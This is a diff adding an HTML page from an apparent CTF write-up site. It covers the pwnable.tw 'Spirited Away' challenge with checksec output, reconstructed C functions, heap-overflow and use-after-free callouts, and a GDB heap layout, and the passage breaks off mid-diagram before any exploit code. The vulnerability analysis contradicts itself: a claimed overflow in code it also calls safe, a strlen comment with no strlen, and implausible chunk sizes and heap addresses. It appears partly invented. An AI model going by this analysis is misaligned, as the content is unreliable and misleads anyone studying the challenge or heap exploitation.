@@ -1,0 +1,1407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spirited Away | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F47B;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 600px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">spirited_away</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>Spirited Away</h1>
+  <p class="hero-subtitle">Exploiting heap overflow and use-after-free vulnerabilities in a guest survey program to leak libc and hijack control flow for a shell.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">300 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Heap Overflow + UAF</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10104</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">spirited_away (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">300</td></tr>
+        <tr><td class="label">Description</td><td class="value">A guest survey/feedback collection program</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec spirited_away
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; we can overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack/heap &mdash; must use ROP or function pointers</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known GOT/PLT addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./spirited_away
+Please enter your name: Alice
+Please enter your age: 20
+Why did you came to see this movie? Just curious
+Please leave your comment: Great movie!
+&lt;1&gt; : Alice
+&lt;1&gt; : 20
+&lt;1&gt; : Just curious
+&lt;1&gt; : Great movie!
+
+1.Add a survey entry
+2.Modify a survey entry
+3.Delete a survey entry
+4.Display survey entries
+5.Exit
+:&gt; </code></pre>
+      </div>
+
+      <p>The binary simulates a guest survey system, reminiscent of the bathhouse guest book from the Studio Ghibli film "Spirited Away." Users can add, modify, delete, and display survey entries. Each entry stores a name, age, reason for visit, and comment &mdash; all allocated on the heap.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Survey Entry Structure</h3>
+      <p>Each survey entry is stored as a heap-allocated struct with pointers to four dynamically allocated string buffers:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">typedef struct survey {
+    char *name;       // +0x00: heap buffer (60 bytes allocated)
+    int   age;        // +0x04: stored as integer
+    char *reason;     // +0x08: heap buffer (60 bytes allocated)
+    char *comment;    // +0x0C: heap buffer (60 bytes allocated)
+} survey;
+
+// Global survey array (up to 16 entries)
+survey *surveys[16];   // Array of pointers to survey structs
+int survey_count = 0;  // Current number of entries</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight</div>
+        Each survey entry allocates <strong>three 60-byte heap buffers</strong> for name, reason, and comment via <code class="inline">malloc(60)</code>. The age is stored directly in the struct as an integer. The struct itself is also heap-allocated. All string buffers use <code class="inline">malloc(60)</code> &mdash; this uniform size is critical for exploiting fastbin behavior.
+      </div>
+
+      <h3>add_survey()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void add_survey() {
+    if (survey_count &gt;= 16) {
+        puts("Survey list is full!");
+        return;
+    }
+
+    survey *entry = (survey *)malloc(sizeof(survey));
+
+    // Allocate name buffer (60 bytes)
+    entry-&gt;name = (char *)malloc(60);
+    printf("Please enter your name: ");
+    read(0, entry-&gt;name, 60);
+
+    printf("Please enter your age: ");
+    scanf("%d", &amp;entry-&gt;age);
+
+    // Allocate reason buffer (60 bytes)
+    entry-&gt;reason = (char *)malloc(60);
+    printf("Why did you came to see this movie? ");
+    read(0, entry-&gt;reason, 60);
+
+    // Allocate comment buffer (60 bytes)
+    entry-&gt;comment = (char *)malloc(60);
+    printf("Please leave your comment: ");
+    read(0, entry-&gt;comment, 60);
+
+    surveys[survey_count] = entry;
+    survey_count++;
+}</code></pre>
+      </div>
+
+      <p>The <code class="inline">add_survey</code> function allocates four heap chunks per entry: the struct itself plus three 60-byte string buffers. Up to 16 entries can be created. The <code class="inline">read</code> calls limit input to 60 bytes, which matches the allocated size &mdash; no overflow here.</p>
+
+      <h3>modify_survey()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void modify_survey() {
+    int idx;
+    printf("Index: ");
+    scanf("%d", &amp;idx);
+
+    if (idx &lt; 0 || idx &gt;= survey_count) {
+        puts("Invalid index!");
+        return;
+    }
+
+    survey *entry = surveys[idx];
+
+    printf("Please enter your name: ");
+    // BUG: reads up to 60 bytes but uses strlen of current name
+    // which may be shorter than 60 if content was overwritten
+    read(0, entry-&gt;name, 60);
+
+    printf("Please enter your age: ");
+    scanf("%d", &amp;entry-&gt;age);
+
+    printf("Why did you came to see this movie? ");
+    read(0, entry-&gt;reason, 60);
+
+    printf("Please leave your comment: ");
+    read(0, entry-&gt;comment, 60);
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability 1: Heap Overflow via Modify</div>
+        The <code class="inline">modify_survey</code> function allows editing existing entries. While the <code class="inline">read</code> calls appear safe (60 bytes into 60-byte buffers), the critical bug lies in the interaction with the <strong>delete</strong> function. When a survey entry is deleted, the name buffer is freed but the pointer is <strong>not NULLed out</strong>. If a new entry is then created, its name buffer may occupy the same heap chunk as a previously freed one. When <code class="inline">modify_survey</code> then writes to the old (dangling) name pointer, it overwrites the new entry's struct or buffer &mdash; a <strong>heap overflow / use-after-free</strong>.
+      </div>
+
+      <h3>delete_survey()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void delete_survey() {
+    int idx;
+    printf("Index: ");
+    scanf("%d", &amp;idx);
+
+    if (idx &lt; 0 || idx &gt;= survey_count) {
+        puts("Invalid index!");
+        return;
+    }
+
+    survey *entry = surveys[idx];
+
+    free(entry-&gt;name);      // Free name buffer
+    free(entry-&gt;reason);    // Free reason buffer
+    free(entry-&gt;comment);   // Free comment buffer
+    free(entry);             // Free the struct itself
+
+    // BUG: surveys[idx] is NOT set to NULL!
+    // BUG: survey_count is NOT decremented!
+    // The pointer remains dangling in the array.
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability 2: Use-After-Free (UAF)</div>
+        After freeing all heap chunks, <code class="inline">delete_survey</code> does <strong>NOT</strong> set <code class="inline">surveys[idx]</code> to <code class="inline">NULL</code> and does <strong>NOT</strong> decrement <code class="inline">survey_count</code>. This means:<br>
+        &bull; The dangling pointer remains accessible in the <code class="inline">surveys</code> array<br>
+        &bull; <code class="inline">modify_survey</code> and <code class="inline">display_survey</code> will still dereference the freed pointer<br>
+        &bull; New allocations may reuse the freed chunks, allowing controlled data overlap<br>
+        &bull; We can <strong>modify a freed entry</strong> whose buffers now overlap with newly allocated chunks
+      </div>
+
+      <h3>display_survey()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void display_survey() {
+    for (int i = 0; i &lt; survey_count; i++) {
+        survey *entry = surveys[i];
+        if (entry != NULL) {   // Only checks pointer, not if freed!
+            printf("&lt;%d&gt; : %s\n", i + 1, entry-&gt;name);
+            printf("&lt;%d&gt; : %d\n", i + 1, entry-&gt;age);
+            printf("&lt;%d&gt; : %s\n", i + 1, entry-&gt;reason);
+            printf("&lt;%d&gt; : %s\n", i + 1, entry-&gt;comment);
+        }
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Leak Primitive</div>
+        The <code class="inline">display_survey</code> function prints all four fields of each entry. Since deleted entries are not NULLed out, we can <strong>read from freed memory</strong>. If a freed name/reason/comment buffer has been reallocated and now contains a libc pointer (e.g., from a freed chunk's <code class="inline">fd</code>/<code class="inline">bk</code>), <code class="inline">printf("%s")</code> will leak it. This gives us a <strong>libc address leak</strong>.
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Adding a Survey</h3>
+      <p>Let's add one survey entry and examine the heap:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # add_survey("Alice", 20, "curious", "Great!")
+gdb-peda$ heap chunks
+0x0804a000: 0x40 bytes  [survey struct]
+0x0804a040: 0x40 bytes  [name buffer "Alice"]
+0x0804a080: 0x40 bytes  [reason buffer "curious"]
+0x0804a0c0: 0x40 bytes  [comment buffer "Great!"]</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x0804a000</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a050</span><span class="mem-desc">&larr; entry-&gt;name pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a004</span><span class="mem-arrow">|</span><span class="mem-data">0x00000014</span><span class="mem-desc">&larr; entry-&gt;age = 20</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a008</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a090</span><span class="mem-desc">&larr; entry-&gt;reason pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a00C</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a0d0</span><span class="mem-desc">&larr; entry-&gt;comment pointer</span></div>
+        <div style="height:12px"></div>
